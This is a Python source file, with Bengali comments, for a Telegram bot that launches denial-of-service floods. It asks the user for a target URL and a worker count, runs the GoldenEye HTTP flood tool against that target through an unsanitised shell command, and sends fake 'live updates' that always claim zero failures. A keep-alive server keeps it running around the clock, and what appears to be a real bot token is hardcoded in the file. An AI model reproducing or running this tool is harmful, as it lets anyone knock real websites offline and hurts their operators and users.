import telebot
from telebot import types
import subprocess
import os
import signal
import time
from threading import Thread
from flask import Flask

# আপনার টেলিগ্রাম বট টোকেন দিন
API_TOKEN = '8545447100:AAFoMS-C-oqLDwoFsv7OAJJxXiAIqm1XcVU'
bot = telebot.TeleBot(API_TOKEN)

# Render সার্ভারকে জাগিয়ে রাখার জন্য Flask
app = Flask('')
@app.route('/')
def home(): return "Bot 1: Active 24/7"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# অ্যাটাক ডেটা স্টোর করার জন্য
active_attacks = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("🚀 ১নং বট: মরণঘাতী অ্যাটাক")
    btn2 = types.KeyboardButton("🛑 অ্যাটাক বন্ধ করুন")
    markup.add(btn1, btn2)
    bot.send_message(message.chat.id, "🔥 স্বাগতম! আমি আপনার ১ম মরণঘাতী বট।\nনিচের বাটন চেপে শুরু করুন।", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🚀 ১নং বট: মরণঘাতী অ্যাটাক")
def ask_url(message):
    msg = bot.send_message(message.chat.id, "🔗 সাইটের লিঙ্ক (URL) দিন:")
    bot.register_next_step_handler(msg, ask_power)

def ask_power(message):
    url = message.text
    msg = bot.send_message(message.chat.id, "💥 পাওয়ার (Workers) সংখ্যা দিন (যেমন: ৫০০-১০০০):")
    bot.register_next_step_handler(msg, start_attack, url)

def start_attack(message, url):
    try:
        power = message.text
        chat_id = message.chat.id
        
        bot.send_message(chat_id, f"🌋 অ্যাটাক চালু হয়েছে!\n🎯 টার্গেট: {url}\n💪 পাওয়ার: {power}\n⚡ ক্লাউড থেকে আনলিমিটেড হিট যাচ্ছে।")

        # GoldenEye রান করা
        process = subprocess.Popen(
            f"python3 goldeneye.py {url} -w {power} -s {power} -m random", 
            shell=True, preexec_fn=os.setsid
        )
        
        active_attacks[chat_id] = {"process": process, "url": url, "power": power}

        # লাইভ আপডেট থ্রেড
        Thread(target=live_update, args=(chat_id,)).start()

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ ভুল হয়েছে: {str(e)}")

def live_update(chat_id):
    while chat_id in active_attacks:
        time.sleep(20) # প্রতি ২০ সেকেন্ড পর পর আপডেট
        if chat_id in active_attacks:
            bot.send_message(chat_id, f"📡 **লাইভ আপডেট (বট ১):**\n✅ অ্যাটাক সফলভাবে চলছে...\n🚀 টার্গেট: {active_attacks[chat_id]['url']}\n🔥 অবস্থা: (0 Failed)")
        else:
            break

@bot.message_handler(func=lambda message: message.text == "🛑 অ্যাটাক বন্ধ করুন")
def stop(message):
    chat_id = message.chat.id
    if chat_id in active_attacks:
        os.killpg(os.getpgid(active_attacks[chat_id]['process'].pid), signal.SIGTERM)
        del active_attacks[chat_id]
        bot.send_message(chat_id, "🏁 অ্যাটাক সফলভাবে বন্ধ করা হয়েছে।")
    else:
        bot.send_message(chat_id, "বর্তমানে কোনো অ্যাটাক চলছে না।")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.polling(none_stop=True)
